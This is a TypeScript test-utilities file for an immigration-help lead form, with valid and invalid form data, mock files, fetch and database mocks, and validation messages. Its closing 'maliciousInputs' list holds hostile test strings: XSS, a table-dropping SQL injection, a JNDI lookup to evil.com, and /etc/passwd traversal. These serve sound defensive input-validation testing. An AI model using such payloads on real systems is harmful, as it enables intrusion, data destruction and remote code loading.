/**
 * Test utilities for form submission testing
 */

export interface TestFormData {
  firstName?: string;
  lastName?: string;
  email?: string;
  country?: string;
  website?: string;
  reason?: string;
  categories?: string[];
  resume?: File | null;
}

export const validFormData: TestFormData = {
  firstName: "John",
  lastName: "Doe",
  email: "john.doe@example.com",
  country: "United States",
  website: "https://johndoe.com",
  reason: "I am seeking immigration assistance for my O-1 visa application.",
  categories: ["O-1"],
};

export const minimalValidFormData: TestFormData = {
  firstName: "Jo",
  lastName: "Do",
  email: "j@d.co",
  country: "US",
  reason: "Immigration help needed.",
  categories: ["I don't know"],
};

export const invalidFormData = {
  empty: {},
  invalidEmail: {
    ...validFormData,
    email: "invalid-email",
  },
  shortReason: {
    ...validFormData,
    reason: "Short",
  },
  invalidCharacters: {
    ...validFormData,
    firstName: "John123",
    lastName: "Doe@#$",
  },
  tooLong: {
    firstName: "A".repeat(51),
    lastName: "B".repeat(51),
    email: "a".repeat(100) + "@example.com",
    country: "C".repeat(101),
    website: "https://" + "d".repeat(200) + ".com",
    reason: "E".repeat(1001),
    categories: ["O-1"],
  },
  invalidCategory: {
    ...validFormData,
    categories: ["Invalid Category"],
  },
  invalidWebsite: {
    ...validFormData,
    website: "not-a-url",
  },
};

export const createMockFile = (
  name: string = "test.pdf",
  type: string = "application/pdf",
  size: number = 1024,
  content: string = "test content"
): File => {
  const buffer = new ArrayBuffer(size);
  const view = new Uint8Array(buffer);

  // Use simple string to bytes conversion for testing
  for (let i = 0; i < Math.min(content.length, size); i++) {
    view[i] = content.charCodeAt(i);
  }

  return new File([buffer], name, { type });
};

export const mockFiles = {
  get validPdf() {
    return createMockFile("resume.pdf", "application/pdf", 1024);
  },
  get validDoc() {
    return createMockFile("resume.doc", "application/msword", 1024);
  },
  get validDocx() {
    return createMockFile(
      "resume.docx",
      "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
      1024
    );
  },
  get validTxt() {
    return createMockFile("resume.txt", "text/plain", 1024);
  },
  get tooLarge() {
    return createMockFile("large.pdf", "application/pdf", 6 * 1024 * 1024);
  },
  get invalidType() {
    return createMockFile("image.jpg", "image/jpeg", 1024);
  },
  get maxSize() {
    return createMockFile("max.pdf", "application/pdf", 5 * 1024 * 1024);
  },
  get justOverMax() {
    return createMockFile("overmax.pdf", "application/pdf", 5 * 1024 * 1024 + 1);
  },
};

export const createFormData = (data: TestFormData): FormData => {
  const formData = new FormData();

  Object.entries(data).forEach(([key, value]) => {
    if (value === null || value === undefined) {
      return;
    }

    if (Array.isArray(value)) {
      value.forEach((item) => formData.append(key, String(item)));
    } else if (value instanceof File) {
      formData.append(key, value);
    } else {
      formData.append(key, String(value));
    }
  });

  return formData;
};

export const mockFetchResponse = (data: any, status: number = 200, ok: boolean = true) => ({
  ok,
  status,
  json: async () => data,
  headers: {
    get: (name: string) => {
      if (name === "Content-Type") {
        return "application/json";
      }
      if (name === "Retry-After" && status === 429) {
        return "900";
      }
      return null;
    },
  },
});

export const mockFetchError = (message: string = "Network error") => {
  throw new Error(message);
};

export const waitForSubmission = async (timeout: number = 5000): Promise<void> => {
  return new Promise((resolve, reject) => {
    const timer = setTimeout(() => {
      reject(new Error(`Submission timed out after ${timeout}ms`));
    }, timeout);

    // In a real test, this would wait for the actual submission
    setTimeout(() => {
      clearTimeout(timer);
      resolve();
    }, 100);
  });
};

// Common error messages for validation
export const errorMessages = {
  required: {
    firstName: "First name is required",
    lastName: "Last name is required",
    email: "Email is required",
    country: "Country is required",
    reason: "Reason is required",
    categories: "At least one category must be selected",
  },
  format: {
    email: "Invalid email format",
    firstName: "First name contains invalid characters",
    lastName: "Last name contains invalid characters",
    website: "Invalid website URL format",
    category: "Invalid category selected",
  },
  length: {
    firstNameShort: "First name must be between 2 and 50 characters",
    firstNameLong: "First name must be between 2 and 50 characters",
    lastNameShort: "Last name must be between 2 and 50 characters",
    lastNameLong: "Last name must be between 2 and 50 characters",
    emailShort: "Email must be between 5 and 100 characters",
    emailLong: "Email must be between 5 and 100 characters",
    countryShort: "Country must be between 2 and 100 characters",
    countryLong: "Country must be between 2 and 100 characters",
    reasonShort: "Reason must be between 10 and 1000 characters",
    reasonLong: "Reason must be between 10 and 1000 characters",
    websiteLong: "Website URL is too long",
  },
  file: {
    tooLarge: "File size must be less than 5MB",
    invalidType: "Only PDF, DOC, DOCX, and TXT files are allowed",
  },
  rateLimit: "Too many requests. Please try again later.",
  server: "An error occurred while processing your request. Please try again.",
};

// Rate limiting test helpers
export const makeMultipleRequests = async (
  requestFn: () => Promise<Response>,
  count: number,
  delay: number = 0
): Promise<Response[]> => {
  const results: Response[] = [];

  for (let i = 0; i < count; i++) {
    if (delay > 0 && i > 0) {
      await new Promise((resolve) => setTimeout(resolve, delay));
    }
    results.push(await requestFn());
  }

  return results;
};

// Database mock helpers
export const createMockPrismaResponse = (id: number = 1) => ({
  id,
  firstName: "John",
  lastName: "Doe",
  email: "john@example.com",
  country: "USA",
  website: "https://example.com",
  reason: "Immigration help",
  categories: ["O-1"],
  resume: null,
  status: "pending",
  createdAt: new Date(),
  updatedAt: new Date(),
});

// Security test patterns
export const maliciousInputs = {
  xss: '<script>alert("xss")</script>',
  sqlInjection: "'; DROP TABLE leads; --",
  ldapInjection: "${jndi:ldap://evil.com/a}",
  pathTraversal: "../../../etc/passwd",
  nullByte: "test\0.pdf",
  longString: "A".repeat(10000),
  unicodeOverflow: "\uFFFD".repeat(1000),
  controlCharacters: "\x00\x01\x02\x03\x04\x05",
  htmlEntities: "&lt;script&gt;alert()&lt;/script&gt;",
  urlEncoded: "%3Cscript%3Ealert()%3C/script%3E",
};
